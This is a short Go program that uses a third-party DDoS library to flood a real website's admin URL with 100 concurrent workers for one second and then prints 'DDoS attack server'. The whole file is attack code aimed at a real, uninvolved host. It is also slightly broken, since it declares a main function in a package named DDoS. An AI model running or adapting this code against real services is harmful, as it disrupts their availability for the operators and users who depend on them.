package DDoS

import (
	"fmt"
	ddos "github.com/Konstantin8105/DDoS"
	"time"
)

//https://stackoverflow.com/admin.php?babyYodaWeeeeeeeeeee

func main() {
	workers := 100
	d, err := ddos.New("https://stackoverflow.com/admin.php?babyYodaWeeeeeeeeeee", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: https://stackoverflow.com/admin.php?babyYodaWeeeeeeeeeee")
	// Output: DDoS attack server: https://stackoverflow.com/admin.php?babyYodaWeeeeeeeeeee
}
